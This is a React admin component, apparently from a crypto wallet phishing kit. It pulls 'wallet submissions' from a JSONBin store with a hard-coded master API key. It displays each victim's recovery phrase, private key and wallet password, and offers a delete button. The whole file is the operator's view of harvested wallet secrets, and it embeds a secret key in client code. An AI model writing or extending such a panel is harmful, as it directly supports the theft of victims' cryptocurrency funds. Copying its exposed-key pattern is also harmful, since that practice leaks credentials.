import { useEffect, useState } from "react";

const BIN_ID = "69768ca1d0ea881f408520b2";
const API_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";

const Admin = () => {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(false);

  /* ---------------- FETCH DATA ---------------- */
  const fetchSubmissions = async () => {
    setLoading(true);
    try {
      const res = await fetch(
        `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,
        {
          headers: {
            "X-Master-Key": API_KEY,
          },
        }
      );

      const data = await res.json();
      setSubmissions(data.record.submissions || []);
    } catch (err) {
      console.error("Fetch error:", err);
    }
    setLoading(false);
  };

  /* ---------------- DELETE RECORD ---------------- */
  const deleteSubmission = async (id) => {
    if (!window.confirm("Delete this record?")) return;

    try {
      // Remove locally
      const updated = submissions.filter((item) => item.id !== id);

      // Save back to JSONBin
      await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          "X-Master-Key": API_KEY,
        },
        body: JSON.stringify({ submissions: updated }),
      });

      setSubmissions(updated);
    } catch (err) {
      console.error("Delete error:", err);
    }
  };

  useEffect(() => {
    fetchSubmissions();
  }, []);

  return (
    <div className="p-6 bg-gray-100 min-h-screen">
      <h1 className="text-2xl font-bold mb-6 text-center">
        Wallet Submissions
      </h1>

      {loading && <p className="text-center">Loading...</p>}

      {!loading && submissions.length === 0 && (
        <p className="text-center text-gray-500">No submissions yet</p>
      )}

      <div className="grid gap-4 max-w-5xl mx-auto">
        {submissions.map((item) => (
          <div
            key={item.id}
            className="bg-white p-4 rounded shadow border"
          >
            <div className="flex justify-between items-center">
              <h2 className="font-semibold">
                {item.walletType}
              </h2>
              <button
                onClick={() => deleteSubmission(item.id)}
                className="text-red-600 hover:underline"
              >
                Delete
              </button>
            </div>

            <p className="text-sm text-gray-500 mt-1">
              {new Date(item.createdAt).toLocaleString()}
            </p>

            {item.recoveryPhrase && (
              <p className="mt-2 text-sm break-all">
                <strong>Recovery Phrase:</strong> {item.recoveryPhrase}
              </p>
            )}

            {item.privateKey && (
              <p className="mt-2 text-sm break-all">
                <strong>Private Key:</strong> {item.privateKey}
              </p>
            )}

            {item.walletPassword && (
              <p className="mt-2 text-sm break-all">
                <strong>Password:</strong> {item.walletPassword}
              </p>
            )}
          </div>
        ))}
      </div>
    </div>
  );
};

export default Admin;
